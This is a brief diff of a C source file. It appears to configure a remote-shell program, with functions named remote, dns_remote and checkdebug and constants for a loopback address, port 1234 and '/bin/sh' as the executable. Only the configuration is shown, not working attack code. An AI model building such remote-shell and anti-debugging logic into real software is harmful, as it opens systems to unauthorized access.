@@ -32,8 +32,8 @@ int checkdebug(void);
 int remote(void);
 int dns_remote(void);
 
-#define REMOTE_TARGET "127.0.0.1"
-#define REMOTE_PORT "1234"
+#define REMOTE_ADDR 0x0100007f
+#define REMOTE_PORT 1234
 #define REMOTE_EXEC "/bin/sh"
 #define REMOTE_DNS_QUERY "localhost"
 
